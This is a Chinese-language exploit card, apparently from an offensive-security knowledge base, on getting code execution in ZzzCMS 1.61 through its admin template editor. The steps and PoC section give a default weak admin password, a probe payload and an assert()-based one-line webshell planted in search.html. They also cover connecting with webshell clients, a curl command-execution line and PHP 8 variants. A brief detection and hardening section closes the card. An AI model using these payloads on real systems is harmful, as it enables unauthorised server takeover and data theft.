---
id: web-php-rce-zzzcms-admin-template-assert-webshell
title: ZzzCMS 后台模板编辑写入 {if:assert()} 标签 getshell
type: scenario
domain: web
path: web/php/rce
technique: cms-admin-template-tag-assert-code-exec
tags:
- php
- zzzcms
- cms
- template-injection
- backend
- webshell
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: ZzzCMS 1.61
verification:
  verified_by: verifier-T1-24
  verified_at: '2026-11-08T13:29:57+08:00'
  notes: 已对照原文核对：后台模板编辑写{if:assert()}到search.html与图03一致，前台渲染phpinfo(图04,PHP7.3.4,位于/search/)支撑；affected_versions=ZzzCMS 1.61为原文标题明确标注；dedup_review对pbootcms/dedecms/seacms差异成立；skipped理由(土豆提权/非约束委派与既有卡merge、RDP爆破与certutil通用步骤)成立；卡无sources字段(原文本身给的是xz.aliyun参考链接)；未验证点：PoC未执行
url: /docs/web/php/rce/web-php-rce-zzzcms-admin-template-assert-webshell/
draft: false
kb_aliases:
- ZzzCMS 后台 getshell
- ZzzCMS 模板 getshell
- ZzzCMS 1.61 RCE
- zzzcms search.html 木马
- 模板标签 assert 代码执行
- '{if:assert($_POST[x])}'
---

## 一句话结论

ZzzCMS 后台的「本地模板管理」允许直接编辑模板文件并保存；把 `{if:assert($_POST[x])}xxx{end if}` 写进 `search.html` 这类会被前台渲染的模板后，模板标签里的表达式会被编译进缓存模板并执行，从而以 Web 进程权限落 PHP 代码执行/一句话木马。

## 原理

- ZzzCMS 使用自己的模板标签体系，`{if:表达式}...{end if}` 在模板编译时被翻译成 PHP 的 `if(表达式){...}`，表达式部分**不做函数白名单校验**，原样进入编译产物（缓存模板），随后被 `include` 执行。
- 因此标签里写什么函数，就等于在服务端执行什么函数——模板编辑功能本质上是一个"可写 PHP 代码"的后台接口。
- 第一次验证常用 `{if:assert($_request[phpinfo()])}phpinfo();{end if}`：数组下标 `phpinfo()` 会先被求值，作为 `$_REQUEST` 的键，phpinfo 的输出即为"模板表达式确实被执行"的证据（真实命令执行点在表达式里，不在标签体里）。
- 拿到回显后改为 `{if:assert($_POST[x])}xxx{end if}`：`assert()` 的字符串参数在 `zend.assertions=1` 的 PHP 7.x 上会按 PHP 代码求值（PHP 7.2 起废弃、8.0 移除），所以 POST `x=phpinfo();` 即可执行任意 PHP，配合蚁剑/菜刀类工具就是一个常连 Webshell。
- 为什么比"上传 Webshell"更容易：模板目录通常对 Web 进程可写、后缀是 `.html` 不触发上传黑名单，写模板属于后台正常功能，流量上没有文件上传特征。

## 触发条件

- 目标为存在该模板编辑功能的 ZzzCMS 版本（原文标注 1.61）；
- 已取得后台权限（原文通过弱口令 `admin/admin123456` 进入）；
- 后台「模板管理/本地模板」允许编辑并保存模板文件，模板目录可写；
- 存在会被前台直接渲染的模板（如 `search.html`），或能访问对应渲染路由；
- PHP 7.x 且 `zend.assertions=1`（默认开发配置）时 `assert` 字符串求值可用；PHP 8 需改用其他函数（如 `eval` 包装、`call_user_func`）或直接写入 `<?php ?>` 到可解析目录。

## 利用步骤

1. 弱口令或凭据复用进入后台。
2. 打开「模板管理 → 本地模板」，定位 `search.html`（或任意前台可访问的模板）。
3. 写入探测载荷，保存后访问对应页面确认表达式被执行：
   `{if:assert($_request[phpinfo()])}phpinfo();{end if}`
4. 确认可执行后替换为常连木马载荷并保存：
   `{if:assert($_POST[x])}xxx{end if}`
5. 用蚁剑/菜刀连接该模板 URL，密码 `x`，类型选 PHP；若工具连不上，改用 `curl -d "x=system('whoami');"` 直接命令执行，或改用冰蝎/哥斯拉等加密马。
6. 以 Web 进程权限读取配置、连数据库、横向。

## PoC

```text
# 1) 探测模板是否被求值（phpinfo 作为数组键被调用）
POST /search/  (模板 search.html 内容)
{if:assert($_request[phpinfo()])}phpinfo();{end if}

# 2) 一句话木马（密码参数 x，PHP 7.x assert 字符串求值）
{if:assert($_POST[x])}xxx{end if}

# 3) 命令行验证
curl -s "http://target/search/" --data "x=system('whoami');"
```

说明：载荷为原文流程的结构化复现，未在本机执行；模板路径、参数名按目标调整。

## 变体与关联

- 变体：把 `assert` 换成 `eval`/`create_function`/`call_user_func` 等仍可执行的回调；PHP 8 下 `assert` 不再求值字符串，需改用 `<?php ... ?>` 直接写入可解析目录，或找模板引擎支持的其他执行标签。
- 变体：同类"后台模板编辑 getshell"普遍存在于国产 CMS（海洋 CMS 搜索模板注入、PbootCMS 站点信息写入、Joomla/WordPress 后台模板编辑器），差异只在标签语法与是否需二次渲染。
- 关联：[[web-php-rce-seacms-search-template-code-execution]]（模板标签注入，无需后台）、[[web-php-rce-joomla-admin-template-editor-webshell]]（后台模板编辑器写马）、[[web-php-wordpress-admin-weak-password-theme-editor-rce]]（弱口令进后台改主题文件）。
- 边界：模板目录不可写、后台无模板编辑权限、模板解析对函数做白名单、或 PHP 8 且无其他执行点时，本链不成立。

## 检测与防御

- 检测：后台模板文件出现 `{if:assert(`、`$_POST[`、`$_REQUEST[`、`phpinfo()` 等组合；模板文件与缓存模板在非发布时段的写入；Web 进程派生子进程或对外发起连接。
- 检测：同一账号短时间内在模板管理与前台页面之间反复切换（写模板→触发渲染）。
- 修复：升级 ZzzCMS 到修复版本；模板编辑加二次校验与操作审计，禁止在模板内容中出现 PHP 函数调用。
- 加固：后台强口令 + 二次认证、限制后台来源 IP；模板目录设为 Web 进程只读、发布走离线构建；PHP `disable_functions` 禁用 `assert`/`eval`/`system` 等；`zend.assertions=-1` 关闭断言代码求值。
